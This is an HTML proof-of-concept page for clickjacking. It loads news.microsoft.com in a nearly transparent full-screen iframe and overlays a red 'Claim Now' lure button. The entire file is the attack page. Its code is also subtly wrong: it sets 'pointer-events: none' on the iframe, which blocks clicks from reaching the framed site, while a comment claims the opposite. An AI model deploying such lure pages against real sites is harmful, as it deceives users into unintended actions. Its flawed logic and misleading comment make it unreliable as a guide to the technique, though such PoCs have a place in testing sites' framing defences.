<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ClikJak PoC</title>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            opacity: 0.1; /* Make it barely visible */
            pointer-events: none; /* Ensure real clicks pass through */
        }
        .fake-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 15px 30px;
            font-size: 20px;
            background: red;
            color: white;
            border: none;
            cursor: pointer;
            z-index: 999;
        }
    </style>
</head>
<body>
    <iframe src="https://news.microsoft.com"></iframe>
    <button class="fake-button">Claim Now</button>
</body>
</html>
